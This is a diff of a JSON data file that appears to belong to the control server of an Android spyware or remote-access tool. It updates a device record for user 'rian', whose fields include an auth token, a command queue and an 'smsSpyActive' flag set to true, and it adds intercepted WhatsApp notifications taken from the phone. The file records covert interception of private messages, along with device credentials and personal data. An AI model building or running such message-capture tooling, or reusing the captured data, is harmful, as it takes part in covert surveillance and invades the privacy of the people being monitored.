@@ -1245,7 +1245,7 @@
     "deviceName": "HP-FREE-A487",
     "ownerUsername": "rian",
     "token": "77751522caef94e9c9f1117d03601776",
-    "lastSeen": 1775189151694,
+    "lastSeen": 1775189154686,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-03T03:51:21.437Z",
@@ -1261,6 +1261,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB¹||STOK AKUN BEBE STR (24 pesan): bebe",
+        "content": "📷 OP?300++,LOG GGL,DATA AMAN\n-BERGARANSI 30H✅\n-ALL AMAN✅",
+        "time": "03/04 11:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775189154976
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "GB¹||STOK AKUN BEBE STR",
+        "content": "‎24 pesan baru",
+        "time": "03/04 11:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775189154292
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB¹||STOK AKUN BEBE STR (24 pesan): bebe",
+        "content": "📷 OP?70++,LOG GGL,DATA AMAN\n-BERGARANSI 30H✅\n-ALL AMAN✅",
+        "time": "03/04 11:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775189154256
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "GB¹||STOK AKUN BEBE STR",
+        "content": "‎20 pesan baru",
+        "time": "03/04 11:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775189153973
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB¹||STOK AKUN BEBE STR (20 pesan): bebe",
